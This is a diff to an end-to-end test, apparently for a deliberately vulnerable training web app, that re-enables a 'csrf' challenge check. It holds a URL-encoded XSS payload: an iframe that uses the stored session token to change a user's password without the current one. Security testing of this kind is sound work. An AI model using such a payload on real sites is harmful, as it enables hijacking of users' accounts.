@@ -27,8 +27,8 @@ describe('/#/change-password', () => {
   describe('challenge "csrf"', () => {
     protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'genderBender' })
 
-    xit('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', () => {
-      browser.get('/#/search?q=%3Cscript%3E%0Axmlhttp%20%3D%20new%20XMLHttpRequest%3B%0Axmlhttp.open(%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%27)%3B%0Axmlhttp.setRequestHeader(%22Content-type%22%2C%22application%2Fjson%22)%3B%0Axmlhttp.setRequestHeader(%22Authorization%22%2C%60Bearer%20%24%7BlocalStorage.getItem(%22token%22)%7D%60)%3B%0Axmlhttp.setRequestHeader(%22Cookie%22%2C%60token%3D%24%7BlocalStorage.getItem(%22token%22)%7D%60)%3B%0Axmlhttp.send()%0A%3C%2Fscript%3E')
+    it('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', () => {
+      browser.get('/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E')
       browser.get('/#/login')
       element(by.id('email')).sendKeys('bender@' + config.get('application.domain'))
       element(by.id('password')).sendKeys('slurmCl4ssic')
@@ -37,6 +37,6 @@ describe('/#/change-password', () => {
       expect(browser.getCurrentUrl()).toMatch(/\/search/)
     })
 
-    // protractor.expect.challengeSolved({ challenge: 'CSRF' })
+    protractor.expect.challengeSolved({ challenge: 'CSRF' })
   })
 })
